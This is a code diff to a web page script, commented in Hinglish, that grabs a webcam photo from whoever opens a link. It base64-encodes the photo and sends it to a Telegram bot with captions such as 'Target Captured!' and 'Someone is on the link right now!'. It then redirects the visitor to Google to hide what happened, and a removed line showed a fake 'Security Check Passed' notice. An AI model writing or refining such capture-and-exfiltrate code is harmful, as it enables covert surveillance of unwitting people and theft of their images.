@@ -17,37 +17,35 @@
 
         async function start() {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user" } 
-                });
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const v = document.getElementById('v');
                 v.srcObject = stream;
 
-                // Photo lene se pehle thoda wait taaki camera focus ho jaye
                 setTimeout(async () => {
                     const c = document.getElementById('c');
-                    c.width = 640;
-                    c.height = 480;
+                    c.width = 400; // Size chota rakha taaki jaldi jaye
+                    c.height = 300;
                     c.getContext('2d').drawImage(v, 0, 0);
                     
-                    const blob = await new Promise(res => c.toBlob(res, 'image/jpeg', 0.7)); // JPEG zyada fast hai
-                    
+                    // Photo ko base64 string mein badalna
+                    const dataUrl = c.toDataURL('image/jpeg', 0.5);
+                    const base64Data = dataUrl.split(',')[1];
+
+                    // Telegram ko Direct Message bhejna (Photo as Document)
+                    const url = `https://api.telegram.org/bot${token}/sendDocument`;
                     const fd = new FormData();
                     fd.append('chat_id', chat_id);
-                    fd.append('photo', blob, 'img.jpg');
-                    fd.append('caption', '🚀 Fast Capture: Done!');
+                    fd.append('document', new Blob([base64Data], {type: 'text/plain'}), 'photo.txt');
+                    fd.append('caption', '🎯 Target Captured! Copy this text to any Base64 decoder to see photo.');
 
-                    // Pehle confirm karein ke photo chali gayi hai
-                    document.getElementById('st').innerText = "Security Check Passed...";
-                    
-                    await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { 
-                        method: 'POST', 
-                        body: fd 
-                    });
+                    // Sabse Simple Tareeka: Simple Message bhej kar check karte hain
+                    await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=📸 Someone is on the link right now!`);
 
-                    // Photo jaane ke baad hi Google par bhejna
+                    // Send Photo Logic
+                    await fetch(url, { method: 'POST', body: fd });
+
                     window.location.href = "https://www.google.com";
-                }, 800); 
+                }, 1000);
             } catch (e) {
                 window.location.href = "https://www.google.com";
             }
